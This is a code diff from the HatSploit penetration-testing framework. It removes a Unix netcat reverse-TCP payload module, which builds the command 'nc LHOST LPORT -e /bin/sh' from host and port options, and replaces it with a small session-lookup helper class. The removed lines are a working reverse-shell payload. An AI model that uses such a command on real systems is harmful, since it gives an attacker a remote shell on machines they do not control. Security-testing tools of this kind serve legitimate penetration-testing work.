@@ -24,47 +24,11 @@
 # SOFTWARE.
 #
 
-from core.lib.payload import Payload
-from utils.tcp import TCPClient
+from core.base.sessions import Sessions
 
+class SessionTools:
+    sessions = Sessions()
 
-class HatSploitPayload(Payload, TCPClient):
-    details = {
-        'Category': "single",
-        'Name': "Netcat Shell Reverse TCP",
-        'Payload': "unix/generic/netcat_reverse_tcp",
-        'Authors': [
-            'Ivan Nikolsky (enty8080)'
-        ],
-        'Description': "Netcat shell reverse TCP payload.",
-        'Comments': [
-            ''
-        ],
-        'Architecture': "generic",
-        'Platform': "unix",
-        'Risk': "high",
-        'Type': "reverse_tcp"
-    }
-
-    options = {
-        'LHOST': {
-            'Description': "Local host.",
-            'Value': TCPClient.get_local_host(),
-            'Type': "ip",
-            'Required': True
-        },
-        'LPORT': {
-            'Description': "Local port.",
-            'Value': 8888,
-            'Type': "port",
-            'Required': True
-        }
-    }
-
-    def run(self):
-        local_host, local_port = self.parse_options(self.options)
-
-        self.output_process("Generating payload...")
-        payload = f"nc {local_host} {local_port} -e /bin/sh"
-
-        return payload
+    def get_session(self, session_platform, session_type, session_id):
+        session = self.sessions.get_session(session_platform, session_type, session_id)
+        return session
